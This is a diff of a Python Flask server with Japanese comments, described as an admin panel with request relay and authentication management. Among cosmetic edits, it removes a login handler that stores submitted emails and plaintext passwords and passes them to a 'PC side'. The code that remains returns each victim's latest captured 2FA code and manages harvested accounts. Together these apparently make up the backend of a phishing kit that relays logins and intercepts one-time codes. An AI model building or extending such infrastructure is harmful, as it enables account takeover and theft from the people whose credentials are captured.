@@ -1,7 +1,7 @@
 """
 本サーバー: 管理画面 + リクエスト中継 + 認証管理
 """
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, render_template
 from flask_socketio import SocketIO
 from flask_cors import CORS
 import requests
@@ -24,7 +24,6 @@ socketio = SocketIO(app, cors_allowed_origins=ALLOWED_ORIGINS)
 
 database.init_db()
 
-# 認証管理データベース
 AUTH_DB_PATH = 'data/auth_database.json'
 
 def load_auth_db():
@@ -149,10 +148,6 @@ def get_all_active_sessions():
             })
     return active_sessions
 
-# ===========================
-# 定期タスク
-# ===========================
-
 scheduler = BackgroundScheduler()
 
 @scheduler.scheduled_job('interval', seconds=60)
@@ -165,10 +160,6 @@ def cleanup_task():
     database.cleanup_old_requests(days=30)
 
 scheduler.start()
-
-# ===========================
-# HTTPエンドポイント
-# ===========================
 
 @app.route('/')
 def index():
@@ -216,7 +207,7 @@ def index():
     </body>
     </html>
     '''
-    return render_template_string(html)
+    return html
 
 @app.route('/api/request', methods=['POST'])
 def create_request():
@@ -270,10 +261,6 @@ def get_request_result(genre, request_id):
         print(f"[ERROR] リクエスト結果取得エラー: {e}")
         return jsonify({'error': str(e)}), 500
 
-# ===========================
-# 管理画面ルート
-# ===========================
-
 @app.route('/admin/top')
 def admin_top():
     return render_template('admintop.html')
@@ -281,35 +268,6 @@ def admin_top():
 @app.route('/admin/accounts')
 def admin_accounts():
     return render_template('adminaccounts.html')
-
-# ===========================
-# 認証API
-# ===========================
-
-@app.route('/api/login', methods=['POST'])
-def api_login():
-    """ログイン処理 (PC側にリクエスト転送)"""
-    try:
-        data = request.json
-        email = data.get('email', '').strip()
-        password = data.get('password', '').strip()
-        
-        # TODO: PC側にログインリクエスト送信
-        # この部分は元のコードのCloudflare接続ロジックを使用
-        
-        # 仮の成功レスポンス
-        create_or_update_account(email, password, 'success')
-        init_twofa_session(email, password)
-        
-        return jsonify({
-            'success': True,
-            'message': 'ログイン成功',
-            'requires_2fa': True
-        })
-        
-    except Exception as e:
-        print(f"[ERROR] ログインエラー: {e}")
-        return jsonify({'success': False, 'message': 'エラーが発生しました'}), 500
 
 @app.route('/api/twofa-status/<email>', methods=['GET'])
 def get_twofa_status(email):
@@ -320,7 +278,6 @@ def get_twofa_status(email):
         if account['email'] == email and account.get('twofa_session'):
             session = account['twofa_session']
             
-            # 最新コードの状態を返す
             if session['codes']:
                 latest_code = session['codes'][-1]
                 return jsonify({
@@ -389,10 +346,6 @@ def api_security_check_status():
     except Exception as e:
         print(f"[ERROR] セキュリティチェック状態確認エラー: {e}")
         return jsonify({'success': False}), 500
-
-# ===========================
-# 管理API
-# ===========================
 
 @app.route('/api/admin/accounts', methods=['GET'])
 def api_admin_accounts():
@@ -480,10 +433,6 @@ def api_admin_block_delete():
     delete_twofa_session(email, password)
     
     return jsonify({'success': True})
-
-# ===========================
-# WebSocketイベント
-# ===========================
 
 @socketio.on('connect')
 def handle_connect():
